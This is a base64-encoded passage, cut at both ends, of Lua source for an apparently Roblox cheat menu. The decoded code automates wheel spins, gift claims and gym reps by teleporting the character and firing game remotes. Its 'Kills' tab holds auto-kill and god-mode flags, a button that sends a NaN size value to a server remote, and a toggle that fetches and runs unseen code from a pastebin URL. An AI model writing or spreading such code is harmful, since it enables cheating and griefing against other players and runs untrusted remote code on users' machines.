3J0dW5lIFdoZWVsIl0pCiAgICAgICAgdGFzay53YWl0KDEpCiAgICBlbmQKZW5kCgpFZ2dzVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIFNwaW4gRm9ydHVuZSBXaGVlbCIsCiAgICBEZXNjID0gIkF1dG9tYXRpY2FsbHkgc3BpbiB0aGUgZm9ydHVuZSB3aGVlbCIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBhdXRvU3BpbldoZWVsRW5hYmxlZCA9IHN0YXRlCiAgICAgICAgaWYgc3RhdGUgdGhlbiB0YXNrLnNwYXduKGF1dG9TcGluV2hlZWwpIGVuZAogICAgZW5kCn0pCgotLSBBdXRvIENsYWltIEdpZnQKbG9jYWwgYXV0b0NsYWltR2lmdCA9IGZhbHNlCgpFZ2dzVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIENsYWltIEdpZnQiLAogICAgRGVzYyA9ICJBdXRvbWF0aWNhbGx5IGNsYWltIGZyZWUgZ2lmdHMiLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgYXV0b0NsYWltR2lmdCA9IHN0YXRlCiAgICAgICAgd2hpbGUgYXV0b0NsYWltR2lmdCBkbwogICAgICAgICAgICBmb3IgaSA9IDEsIDggZG8KICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLmZyZWVHaWZ0Q2xhaW1SZW1vdGU6SW52b2tlU2VydmVyKCJjbGFpbUdpZnQiLCBpKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIEd5bSBUYWIKbG9jYWwgR3ltVGFiID0gV2luZG93OlRhYih7VGl0bGUgPSAiR3ltIiwgSWNvbiA9ICJkdW1iYmVsbCJ9KQoKR3ltVGFiOlNlY3Rpb24oe1RpdGxlID0gIkdZTSBNQUNISU5FUyJ9KQoKbG9jYWwgY3VycmVudE1hY2hpbmUgPSBuaWwKbG9jYWwgY3VycmVudE1hY2hpbmVBY3RpdmUgPSBmYWxzZQoKLS0gRnVuY3Rpb24gdG8gdXNlIG1hY2hpbmUgKHRlbGVwb3J0IG9uY2UpCmxvY2FsIGZ1bmN0aW9uIHNldHVwTWFjaGluZShtYWNoaW5lTmFtZSkKICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBtYWNoaW5lID0gd29ya3NwYWNlLm1hY2hpbmVzRm9sZGVyOkZpbmRGaXJzdENoaWxkKG1hY2hpbmVOYW1lKQogICAgICAgIGlmIG1hY2hpbmUgYW5kIG1hY2hpbmU6RmluZEZpcnN0Q2hpbGQoImludGVyYWN0U2VhdCIpIHRoZW4KICAgICAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBpZiBjaGFyYWN0ZXIgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICAgICAgICAgIGNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IG1hY2hpbmUuaW50ZXJhY3RTZWF0LkNGcmFtZQogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICAgICAgICAgIGN1cnJlbnRNYWNoaW5lID0gbWFjaGluZU5hbWUKICAgICAgICAgICAgICAgIGN1cnJlbnRNYWNoaW5lQWN0aXZlID0gdHJ1ZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZCkKZW5kCgotLSBGdW5jdGlvbiB0byBzdG9wIHVzaW5nIG1hY2hpbmUKbG9jYWwgZnVuY3Rpb24gc3RvcE1hY2hpbmUoKQogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICBpZiBjaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICBjaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID0gZmFsc2UKICAgICAgICAgICAgY2hhcmFjdGVyLkh1bWFub2lkLkp1bXAgPSB0cnVlCiAgICAgICAgICAgIGN1cnJlbnRNYWNoaW5lID0gbmlsCiAgICAgICAgICAgIGN1cnJlbnRNYWNoaW5lQWN0aXZlID0gZmFsc2UKICAgICAgICBlbmQKICAgIGVuZCkKZW5kCgotLSBGdW5jdGlvbiB0byBkbyByZXBzIG9uIGN1cnJlbnQgbWFjaGluZQpsb2NhbCBmdW5jdGlvbiBkb01hY2hpbmVSZXBzKCkKICAgIGlmIGN1cnJlbnRNYWNoaW5lQWN0aXZlIGFuZCBjdXJyZW50TWFjaGluZSB0aGVuCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCBtYWNoaW5lID0gd29ya3NwYWNlLm1hY2hpbmVzRm9sZGVyOkZpbmRGaXJzdENoaWxkKGN1cnJlbnRNYWNoaW5lKQogICAgICAgICAgICBpZiBtYWNoaW5lIGFuZCBtYWNoaW5lOkZpbmRGaXJzdENoaWxkKCJpbnRlcmFjdFNlYXQiKSB0aGVuCiAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5tYWNoaW5lSW50ZXJhY3RSZW1vdGU6SW52b2tlU2VydmVyKCJ1c2VNYWNoaW5lIiwgbWFjaGluZS5pbnRlcmFjdFNlYXQpCiAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJyZXAiLCBtYWNoaW5lLmludGVyYWN0U2VhdCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCmVuZAoKLS0gTWFjaGluZSBUb2dnbGUgQ3JlYXRvciBGdW5jdGlvbgpsb2NhbCBmdW5jdGlvbiBjcmVhdGVNYWNoaW5lVG9nZ2xlKHBhcmVudCwgdGl0bGUsIG1hY2hpbmVOYW1lLCBzdGF0ZVZhcikKICAgIHBhcmVudDpUb2dnbGUoewogICAgICAgIFRpdGxlID0gdGl0bGUsCiAgICAgICAgRGVzYyA9ICJBdXRvIHVzZSAiIC4uIG1hY2hpbmVOYW1lLAogICAgICAgIFZhbHVlID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgc3RhdGVWYXIgPSBzdGF0ZQogICAgICAgICAgICBpZiBzdGF0ZSB0aGVuCiAgICAgICAgICAgICAgICBzdG9wTWFjaGluZSgpCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAgICAgc2V0dXBNYWNoaW5lKG1hY2hpbmVOYW1lKQogICAgICAgICAgICAgICAgd2hpbGUgc3RhdGVWYXIgYW5kIGN1cnJlbnRNYWNoaW5lID09IG1hY2hpbmVOYW1lIGRvCiAgICAgICAgICAgICAgICAgICAgZG9NYWNoaW5lUmVwcygpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDEpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgaWYgY3VycmVudE1hY2hpbmUgPT0gbWFjaGluZU5hbWUgdGhlbgogICAgICAgICAgICAgICAgICAgIHN0b3BNYWNoaW5lKCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0pCmVuZAoKLS0gVGlueSBHeW0gU2VjdGlvbgpHeW1UYWI6U2VjdGlvbih7VGl0bGUgPSAi8J+PoCBUaW55IEd5bSJ9KQpsb2NhbCB0aW55QmVuY2gsIHRpbnlTcXVhdCwgdGlueVB1bGx1cHMsIHRpbnlEZWFkbGlmdCA9IGZhbHNlLCBmYWxzZSwgZmFsc2UsIGZhbHNlCgpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIkJlbmNoIFByZXNzIiwgIkJlbmNoIFByZXNzIiwgdGlueUJlbmNoKQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIlNxdWF0IFJhY2siLCAiU3F1YXQgUmFjayIsIHRpbnlTcXVhdCkKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJQdWxsdXBzIiwgIlB1bGx1cHMiLCB0aW55UHVsbHVwcykKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJEZWFkbGlmdCIsICJEZWFkbGlmdCIsIHRpbnlEZWFkbGlmdCkKCi0tIEZyb3N0IEd5bSBTZWN0aW9uCkd5bVRhYjpTZWN0aW9uKHtUaXRsZSA9ICLinYTvuI8gRnJvc3QgR3ltIn0pCmxvY2FsIGZyb3N0UHJlc3MsIGZyb3N0TGlmdCwgZnJvc3RTcXVhdCwgZnJvc3RCb3VsZGVyID0gZmFsc2UsIGZhbHNlLCBmYWxzZSwgZmFsc2UKCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiRnJvc3QgUHJlc3MiLCAiRnJvc3QgUHJlc3MiLCBmcm9zdFByZXNzKQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIkZyb3N0IExpZnQiLCAiRnJvc3QgTGlmdCIsIGZyb3N0TGlmdCkKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJGcm9zdCBTcXVhdCIsICJGcm9zdCBTcXVhdCIsIGZyb3N0U3F1YXQpCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiQm91bGRlciBUaHJvdyIsICJCb3VsZGVyIFRocm93IiwgZnJvc3RCb3VsZGVyKQoKLS0gTXl0aGljYWwgR3ltIFNlY3Rpb24KR3ltVGFiOlNlY3Rpb24oe1RpdGxlID0gIuKcqCBNeXRoaWNhbCBHeW0ifSkKbG9jYWwgbXl0aGljYWxQcmVzcywgbXl0aGljYWxQdWxsdXAsIG15dGhpY2FsVGhyb3cgPSBmYWxzZSwgZmFsc2UsIGZhbHNlCgpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIk15dGhpY2FsIFByZXNzIiwgIk15dGhpY2FsIFByZXNzIiwgbXl0aGljYWxQcmVzcykKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJNeXRoaWNhbCBQdWxsdXAiLCAiTXl0aGljYWwgUHVsbHVwIiwgbXl0aGljYWxQdWxsdXApCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiTXl0aGljYWwgVGhyb3ciLCAiTXl0aGljYWwgVGhyb3ciLCBteXRoaWNhbFRocm93KQoKLS0gSW5mZXJubyBHeW0gU2VjdGlvbgpHeW1UYWI6U2VjdGlvbih7VGl0bGUgPSAi8J+UpSBJbmZlcm5vIEd5bSJ9KQpsb2NhbCBldGVybmFsUHJlc3MgPSBmYWxzZQoKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJFdGVybmFsIFByZXNzIiwgIkV0ZXJuYWwgUHJlc3MiLCBldGVybmFsUHJlc3MpCgotLSBMZWdlbmRzIEd5bSBTZWN0aW9uCkd5bVRhYjpTZWN0aW9uKHtUaXRsZSA9ICLwn4yfIExlZ2VuZHMgR3ltIn0pCmxvY2FsIGxlZ2VuZHNQcmVzcywgbGVnZW5kc0xpZnQsIGxlZ2VuZHNTcXVhdCwgbGVnZW5kc1B1bGx1cCwgbGVnZW5kc1Rocm93ID0gZmFsc2UsIGZhbHNlLCBmYWxzZSwgZmFsc2UsIGZhbHNlCgpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIkxlZ2VuZHMgUHJlc3MiLCAiTGVnZW5kcyBQcmVzcyIsIGxlZ2VuZHNQcmVzcykKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJMZWdlbmRzIExpZnQiLCAiTGVnZW5kcyBMaWZ0IiwgbGVnZW5kc0xpZnQpCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiTGVnZW5kcyBTcXVhdCIsICJMZWdlbmRzIFNxdWF0IiwgbGVnZW5kc1NxdWF0KQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIkxlZ2VuZHMgUHVsbHVwIiwgIkxlZ2VuZHMgUHVsbHVwIiwgbGVnZW5kc1B1bGx1cCkKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJMZWdlbmRzIFRocm93IiwgIkxlZ2VuZHMgVGhyb3ciLCBsZWdlbmRzVGhyb3cpCgotLSBNdXNjbGUgS2luZyBHeW0gU2VjdGlvbgpHeW1UYWI6U2VjdGlvbih7VGl0bGUgPSAi8J+RkSBNdXNjbGUgS2luZyBHeW0ifSkKbG9jYWwga2luZ0JlbmNoLCBraW5nTGlmdCwga2luZ1NxdWF0LCBraW5nTW91bnRhaW4sIGtpbmdCb3VsZGVyID0gZmFsc2UsIGZhbHNlLCBmYWxzZSwgZmFsc2UsIGZhbHNlCgpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIk11c2NsZSBLaW5nIEJlbmNoIiwgIk11c2NsZSBLaW5nIEJlbmNoIiwga2luZ0JlbmNoKQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIk11c2NsZSBLaW5nIExpZnQiLCAiTXVzY2xlIEtpbmcgTGlmdCIsIGtpbmdMaWZ0KQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIk11c2NsZSBLaW5nIFNxdWF0IiwgIk11c2NsZSBLaW5nIFNxdWF0Iiwga2luZ1NxdWF0KQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIk11c2NsZSBLaW5nIE1vdW50YWluIiwgIk11c2NsZSBLaW5nIE1vdW50YWluIiwga2luZ01vdW50YWluKQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIktpbmcgQm91bGRlciIsICJLaW5nIEJvdWxkZXIiLCBraW5nQm91bGRlcikKCi0tIEp1bmdsZSBHeW0gU2VjdGlvbgpHeW1UYWI6U2VjdGlvbih7VGl0bGUgPSAi8J+MtCBKdW5nbGUgR3ltIn0pCmxvY2FsIGp1bmdsZUJlbmNoLCBqdW5nbGVMaWZ0LCBqdW5nbGVTcXVhdCwganVuZ2xlQm91bGRlciA9IGZhbHNlLCBmYWxzZSwgZmFsc2UsIGZhbHNlCgpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIkp1bmdsZSBCZW5jaCIsICJKdW5nbGUgQmVuY2giLCBqdW5nbGVCZW5jaCkKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJKdW5nbGUgQmFyIExpZnQiLCAiSnVuZ2xlIEJhciBMaWZ0IiwganVuZ2xlTGlmdCkKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJKdW5nbGUgU3F1YXQiLCAiSnVuZ2xlIFNxdWF0IiwganVuZ2xlU3F1YXQpCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiSnVuZ2xlIEJvdWxkZXIiLCAiSnVuZ2xlIEJvdWxkZXIiLCBqdW5nbGVCb3VsZGVyKQoKLS0gU3RhdHMgVGFiCmxvY2FsIFN0YXRzVGFiID0gV2luZG93OlRhYih7VGl0bGUgPSAiU3RhdHMiLCBJY29uID0gImFjdGl2aXR5In0pCgotLSBTZXNzaW9uIFRpbWVyIFNlY3Rpb24KU3RhdHNUYWI6U2VjdGlvbih7VGl0bGUgPSAiU2Vzc2lvbiBUaW1lciJ9KQpsb2NhbCB0aW1lckxhYmVsID0gU3RhdHNUYWI6TGFiZWwoe1RpdGxlID0gIuKPsCBUSU1FIiwgRGVzYyA9ICIwcyAwbSAwaCAwZCJ9KQoKdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICBsb2NhbCBzdGFydFRpbWUgPSB0aWNrKCkKICAgIAogICAgd2hpbGUgdGFzay53YWl0KDEpIGRvCiAgICAgICAgbG9jYWwgZWxhcHNlZCA9IHRpY2soKSAtIHN0YXJ0VGltZQogICAgICAgIAogICAgICAgIGxvY2FsIHNlY29uZHMgPSBtYXRoLmZsb29yKGVsYXBzZWQgJSA2MCkKICAgICAgICBsb2NhbCBtaW51dGVzID0gbWF0aC5mbG9vcigoZWxhcHNlZCAvIDYwKSAlIDYwKSAKICAgICAgICBsb2NhbCBob3VycyA9IG1hdGguZmxvb3IoKGVsYXBzZWQgLyAzNjAwKSAlIDI0KQogICAgICAgIGxvY2FsIGRheXMgPSBtYXRoLmZsb29yKGVsYXBzZWQgLyA4NjQwMCkKICAgICAgICAKICAgICAgICB0aW1lckxhYmVsOlNldERlc2Moc3RyaW5nLmZvcm1hdCgiJWRzICVkbSAlZGggJWRkIiwgc2Vjb25kcywgbWludXRlcywgaG91cnMsIGRheXMpKQogICAgZW5kCmVuZCkKCi0tIFN0YXRzIERpc3BsYXkgU2VjdGlvbgpTdGF0c1RhYjpTZWN0aW9uKHtUaXRsZSA9ICLwn5OKIFNUQVRTIn0pCgotLSBIZWxwZXIgZnVuY3Rpb24gdG8gZm9ybWF0IG51bWJlcnMKbG9jYWwgZnVuY3Rpb24gZm9ybWF0TnVtYmVyKHZhbHVlKQogICAgbG9jYWwgcmF3Rm9ybWF0dGVkID0gdG9zdHJpbmcodmFsdWUpOnJldmVyc2UoKTpnc3ViKCIlZCVkJWQiLCAiJTEsIik6cmV2ZXJzZSgpOmdzdWIoIl4sIiwgIiIpCiAgICAKICAgIGxvY2FsIGFiYnJldmlhdGVkID0gIiIKICAgIGlmIHZhbHVlID49IDEwMDAwMDAwMDAwMDAwMDAwMDAgdGhlbgogICAgICAgIGFiYnJldmlhdGVkID0gc3RyaW5nLmZvcm1hdCgiJS4xZlFpIiwgdmFsdWUgLyAxMDAwMDAwMDAwMDAwMDAwMDAwKQogICAgZWxzZWlmIHZhbHVlID49IDEwMDAwMDAwMDAwMDAwMDAgdGhlbgogICAgICAgIGFiYnJldmlhdGVkID0gc3RyaW5nLmZvcm1hdCgiJS4xZlFhIiwgdmFsdWUgLyAxMDAwMDAwMDAwMDAwMDAwKQogICAgZWxzZWlmIHZhbHVlID49IDEwMDAwMDAwMDAwMDAgdGhlbgogICAgICAgIGFiYnJldmlhdGVkID0gc3RyaW5nLmZvcm1hdCgiJS4xZlQiLCB2YWx1ZSAvIDEwMDAwMDAwMDAwMDApCiAgICBlbHNlaWYgdmFsdWUgPj0gMTAwMDAwMDAwMCB0aGVuCiAgICAgICAgYWJicmV2aWF0ZWQgPSBzdHJpbmcuZm9ybWF0KCIlLjFmQiIsIHZhbHVlIC8gMTAwMDAwMDAwMCkKICAgIGVsc2VpZiB2YWx1ZSA+PSAxMDAwMDAwIHRoZW4KICAgICAgICBhYmJyZXZpYXRlZCA9IHN0cmluZy5mb3JtYXQoIiUuMWZNIiwgdmFsdWUgLyAxMDAwMDAwKQogICAgZWxzZWlmIHZhbHVlID49IDEwMDAgdGhlbgogICAgICAgIGFiYnJldmlhdGVkID0gc3RyaW5nLmZvcm1hdCgiJS4xZksiLCB2YWx1ZSAvIDEwMDApCiAgICBlbHNlCiAgICAgICAgYWJicmV2aWF0ZWQgPSB0b3N0cmluZyh2YWx1ZSkKICAgIGVuZAogICAgCiAgICByZXR1cm4gcmF3Rm9ybWF0dGVkLCBhYmJyZXZpYXRlZAplbmQKCi0tIEhlbHBlciBmdW5jdGlvbiB0byBjcmVhdGUgc3RhdCBkaXNwbGF5CmxvY2FsIGZ1bmN0aW9uIGNyZWF0ZVN0YXREaXNwbGF5KHN0YXROYW1lLCBlbW9qaSwgc3RhdFBhdGgsIGlzTGVhZGVyc3RhdCkKICAgIGxvY2FsIGxhYmVsID0gU3RhdHNUYWI6TGFiZWwoe1RpdGxlID0gZW1vamkgLi4gIiAiIC4uIHN0YXROYW1lLCBEZXNjID0gIjAgKDApIHwgR0FJTkVEOiAwICgwKSJ9KQogICAgbG9jYWwgc3RhcnRWYWx1ZSA9IGlzTGVhZGVyc3RhdCBhbmQgCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLmxlYWRlcnN0YXRzW3N0YXRQYXRoXS5WYWx1ZSBvciAKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXJbc3RhdFBhdGhdLlZhbHVlCiAgICAKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIHRhc2sud2FpdCgxKSBkbwogICAgICAgICAgICBsb2NhbCBjdXJyZW50VmFsdWUgPSBpc0xlYWRlcnN0YXQgYW5kIAogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLmxlYWRlcnN0YXRzW3N0YXRQYXRoXS5WYWx1ZSBvciAKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcltzdGF0UGF0aF0uVmFsdWUKICAgICAgICAgICAgbG9jYWwgZ2FpbmVkID0gY3VycmVudFZhbHVlIC0gc3RhcnRWYWx1ZQogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgY3VycmVudFJhdywgY3VycmVudEFiYnIgPSBmb3JtYXROdW1iZXIoY3VycmVudFZhbHVlKQogICAgICAgICAgICBsb2NhbCBnYWluZWRSYXcsIGdhaW5lZEFiYnIgPSBmb3JtYXROdW1iZXIoZ2FpbmVkKQogICAgICAgICAgICAKICAgICAgICAgICAgbGFiZWw6U2V0RGVzYyhzdHJpbmcuZm9ybWF0KCIlcyAoJXMpIHwgR0FJTkVEOiAlcyAoJXMpIiwgCiAgICAgICAgICAgICAgICBjdXJyZW50UmF3LCBjdXJyZW50QWJiciwgZ2FpbmVkUmF3LCBnYWluZWRBYmJyKSkKICAgICAgICBlbmQKICAgIGVuZCkKICAgIAogICAgcmV0dXJuIGxhYmVsCmVuZAoKLS0gQ3JlYXRlIGFsbCBzdGF0IGRpc3BsYXlzCmNyZWF0ZVN0YXREaXNwbGF5KCJTdHJlbmd0aCIsICLwn5KqIiwgIlN0cmVuZ3RoIiwgdHJ1ZSkKY3JlYXRlU3RhdERpc3BsYXkoIkR1cmFiaWxpdHkiLCAi8J+boe+4jyIsICJEdXJhYmlsaXR5IiwgZmFsc2UpCmNyZWF0ZVN0YXREaXNwbGF5KCJBZ2lsaXR5IiwgIuKaoSIsICJBZ2lsaXR5IiwgZmFsc2UpCmNyZWF0ZVN0YXREaXNwbGF5KCJSZWJpcnRocyIsICLwn5SEIiwgIlJlYmlydGhzIiwgdHJ1ZSkKY3JlYXRlU3RhdERpc3BsYXkoIkJyYXdscyIsICLwn6WKIiwgIkJyYXdscyIsIHRydWUpCmNyZWF0ZVN0YXREaXNwbGF5KCJLaWxscyIsICLwn5KAIiwgIktpbGxzIiwgdHJ1ZSkKY3JlYXRlU3RhdERpc3BsYXkoIkdvb2QgS2FybWEiLCAi8J+YhyIsICJnb29kS2FybWEiLCBmYWxzZSkKY3JlYXRlU3RhdERpc3BsYXkoIkV2aWwgS2FybWEiLCAi8J+YiCIsICJldmlsS2FybWEiLCBmYWxzZSkKCi0tIEtpbGxzIFRhYgpsb2NhbCBLaWxsc1RhYiA9IFdpbmRvdzpUYWIoe1RpdGxlID0gIktpbGxzIiwgSWNvbiA9ICJ0YXJnZXQifSkKCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgcGxheWVyV2hpdGVsaXN0ID0ge30KbG9jYWwgdGFyZ2V0UGxheWVyTmFtZXMgPSB7fQpsb2NhbCBhdXRvS2lsbCA9IGZhbHNlCmxvY2FsIGtpbGxUYXJnZXQgPSBmYWxzZQpsb2NhbCBzcHlpbmcgPSBmYWxzZQpsb2NhbCBhdXRvUHVuY2hOb0FuaW0gPSBmYWxzZQpsb2NhbCB0YXJnZXREcm9wZG93bkl0ZW1zID0ge30KbG9jYWwgZnJpZW5kV2hpdGVsaXN0QWN0aXZlID0gZmFsc2UKbG9jYWwgZ29kTW9kZVRvZ2dsZSA9IGZhbHNlCmxvY2FsIGZvbGxvd2luZyA9IGZhbHNlCmxvY2FsIGZvbGxvd1RhcmdldCA9IG5pbApsb2NhbCBnb2REYW1hZ2VBY3RpdmUgPSBmYWxzZQoKLS0gUGV0IFNlbGVjdGlvbiBTZWN0aW9uCktpbGxzVGFiOlNlY3Rpb24oe1RpdGxlID0gIkVxdWlwIFBldHMifSkKCmxvY2FsIHBldERyb3Bkb3duID0gS2lsbHNUYWI6RHJvcGRvd24oewogICAgVGl0bGUgPSAiU2VsZWN0IFBldCIsCiAgICBMaXN0ID0geyJXaWxkIFdpemFyZCIsICJNaWdodHkgTW9uc3RlciJ9LAogICAgVmFsdWUgPSAiIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odGV4dCkKICAgICAgICBsb2NhbCBwZXRzRm9sZGVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLnBldHNGb2xkZXIKICAgICAgICBmb3IgXywgZm9sZGVyIGluIHBhaXJzKHBldHNGb2xkZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgaWYgZm9sZGVyOklzQSgiRm9sZGVyIikgdGhlbgogICAgICAgICAgICAgICAgZm9yIF8sIHBldCBpbiBwYWlycyhmb2xkZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5lcXVpcFBldEV2ZW50OkZpcmVTZXJ2ZXIoInVuZXF1aXBQZXQiLCBwZXQpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgdGFzay53YWl0KDAuMikKCiAgICAgICAgbG9jYWwgcGV0TmFtZSA9IHRleHQKICAgICAgICBsb2NhbCBwZXRzVG9FcXVpcCA9IHt9CgogICAgICAgIGZvciBfLCBwZXQgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLnBldHNGb2xkZXIuVW5pcXVlOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIHBldC5OYW1lID09IHBldE5hbWUgdGhlbgogICAgICAgICAgICAgICAgdGFibGUuaW5zZXJ0KHBldHNUb0VxdWlwLCBwZXQpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBtYXhQZXRzID0gOAogICAgICAgIGxvY2FsIGVxdWlwcGVkQ291bnQgPSBtYXRoLm1pbigjcGV0c1RvRXF1aXAsIG1heFBldHMpCgogICAgICAgIGZvciBpID0gMSwgZXF1aXBwZWRDb3VudCBkbwogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5lcXVpcFBldEV2ZW50OkZpcmVTZXJ2ZXIoImVxdWlwUGV0IiwgcGV0c1RvRXF1aXBbaV0pCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIFV0aWxpdHkgU2VjdGlvbgpLaWxsc1RhYjpTZWN0aW9uKHtUaXRsZSA9ICJVdGlsaXR5In0pCgpLaWxsc1RhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiUmVtb3ZlIEF0dGFjayBBbmltYXRpb25zIiwKICAgIFZhbHVlID0gZmFsc2UsIAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBpZiBzdGF0ZSB0aGVuCiAgICAgICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvWFVuZm02S0oiKSkoKQogICAgICAgIGVuZAogICAgZW5kCn0pCgpLaWxsc1RhYjpCdXR0b24oewogICAgVGl0bGUgPSAiTmFOIFNpemUiLAogICAgRGVzYyA9ICJTZXQgY2hhcmFjdGVyIHNpemUgdG8gTmFOIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIGFyZ3MgPSB7ImNoYW5nZVNpemUiLCAwLzB9CiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpOldhaXRGb3JDaGlsZCgickV2ZW50cyIpOldhaXRGb3JDaGlsZCgiY2hhbmdlU3BlZWRTaXplUmVtb3RlIik6SW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgIGVuZAp9KQoKLS0gV2hpdGVsaXN0IE1hbmFnZW1lbnQgU2VjdGlvbgpLaWxsc1RhYjpTZWN0aW9uKHtUaXRsZSA9ICJXaGl0ZWxpc3QgTWFuYWdlbWVudCJ9KQoKS2lsbHNUYWI6VGV4dGJveCh7CiAgICBUaXRsZSA9ICJXaGl0ZWxpc3QgUGxheWVyIiwKICAgIERlc2MgPSAiQWRkIHBsYXllciB0byB3aGl0ZWxpc3QiLAogICAgUGxhY2Vob2xkZXIgPSAiUGxh